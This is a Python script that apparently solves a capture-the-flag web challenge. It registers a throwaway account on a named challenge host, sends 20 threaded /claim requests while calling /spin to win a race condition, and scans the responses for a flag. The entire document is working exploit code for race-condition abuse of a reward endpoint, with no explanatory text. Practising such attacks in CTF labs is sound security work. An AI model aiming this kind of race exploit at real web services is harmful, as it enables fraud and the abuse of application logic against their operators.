import requests, threading, time, random, string

base = 'https://web-random-cheese.tracebash.xyz'

# Use correct race: send multiple claims before any spin completes
s = requests.Session()
name = ''.join(random.choices(string.ascii_lowercase, k=8))
s.post(f'{base}/register', data={'username': name, 'password': name})
s.post(f'{base}/login', data={'username': name, 'password': name})

import urllib3
urllib3.disable_warnings()

responses = []
def do_claim(idx):
    r = s.post(f'{base}/claim', timeout=5)
    responses.append(r.content)
    print(f'Claim {idx}: status={r.status_code}, has_flag={"CTF" in r.text or "flag{" in r.text.lower()}')
    if 'CTF' in r.text or 'flag{' in r.text.lower():
        # Search for flag pattern
        import re
        for match in re.findall(r'[A-Za-z0-9_\{\}]{10,}', r.text):
            if '{' in match:
                print('FLAG:', repr(match))

# Start racing threads right away
threads = []
for i in range(20):
    t = threading.Thread(target=do_claim, args=(i,))
    threads.append(t)
    t.start()

time.sleep(0.5)

# Now try spinning
for i in range(3):
    try:
        r = s.post(f'{base}/spin', timeout=5)
        print(f'Spin {i}:', r.text[:100])
    except:
        pass

for t in threads:
    t.join(timeout=2)

print(f'\nTotal responses captured: {len(responses)}')
for r in responses:
    raw = r.decode('utf-8', errors='replace')
    if 'score' in raw.lower(): 
        # Extract the flash message
        import re
        msgs = re.findall(r'<span[^>]*>([^<]+)', raw)
        for m in msgs:
            print('Message:', repr(m))